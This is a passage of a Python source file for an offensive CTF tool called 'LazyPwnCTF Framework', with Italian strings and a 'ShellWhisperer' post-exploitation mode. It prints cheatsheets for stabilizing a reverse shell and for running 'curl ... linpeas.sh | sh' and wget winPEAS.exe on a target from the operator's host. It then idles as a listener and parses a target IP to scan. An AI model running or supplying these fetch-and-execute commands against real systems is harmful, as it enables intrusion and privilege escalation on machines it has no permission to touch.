[bold cyan]3. Background e stty raw (Premi Ctrl+Z, poi digita):[/bold cyan]
stty raw -echo; fg
"""
        
        console.print(Panel(cheatsheet_tty, title="TTY Stabilization Cheatsheet", border_style="magenta"))
        
        cheatsheet_transfer = f"""[bold cyan]Curl/Wget Drop (Esegui sul target):[/bold cyan]
curl http://{ip}:{port}/linpeas.sh | sh
wget http://{ip}:{port}/winPEAS.exe -O %TEMP%\\winPEAS.exe
"""
        console.print(Panel(cheatsheet_transfer, title="File Transfer Cheatsheet", border_style="yellow"))
        
        try:
             console.print("[yellow]Server in ascolto... premi Ctrl+C per uscire.[/yellow]")
             while True:
                 import time
                 time.sleep(1)
        except KeyboardInterrupt:
             console.print("\n[red]Spegnimento ShellWhisperer.[/red]")
            
import argparse

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LazyPwnCTF Framework")
    parser.add_argument("ip", nargs="?", help="IP Target da scansionare")
    parser.add_argument("--shell", action="store_true", help="Avvia ShellWhisperer in post-exploitation")
    
    args = parser.add_argument_group('options').parse_args() if '--shell' in sys.argv else parser.parse_args()
    
    if args.shell:
        whisperer = ShellWhisperer()
        whisperer.run()
        sys.exit(0)
        
    if not args.ip:
        parser.print_help()
        sys.exit(1)
        
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
        
    try:
        asyncio.run(pipeline(args.ip, os.getcwd()))
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C rilevato a livello globale. Exiting.")
        sys.exit(0)